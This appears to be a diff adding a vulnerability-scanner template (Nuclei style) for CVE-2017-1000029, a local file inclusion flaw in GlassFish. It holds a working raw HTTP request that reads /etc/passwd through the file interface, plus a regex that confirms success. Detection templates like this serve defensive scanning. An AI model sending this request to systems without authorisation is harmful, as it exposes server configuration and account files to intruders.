@@ -1,0 +1,31 @@
+id: cve-2017-1000029
+
+info:
+  name: GlassFish application server file interface local file inclusion vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Oracle GlassFish Server Open Source Edition is an open source version of Oracle's server for building Java EE (server-side Java applications). By constructing malicious requests, attackers can read local files on the server, including sensitive information such as system configuration files and log files.
+  reference:
+    - https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18784
+    - http://www.oracle.com/
+  classification:
+    cve-id: CVE-2017-1000029
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-98
+
+http:
+  - raw:
+      - |
+        GET /resource/file%3a///etc/passwd/ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:(.*?):0:0:"
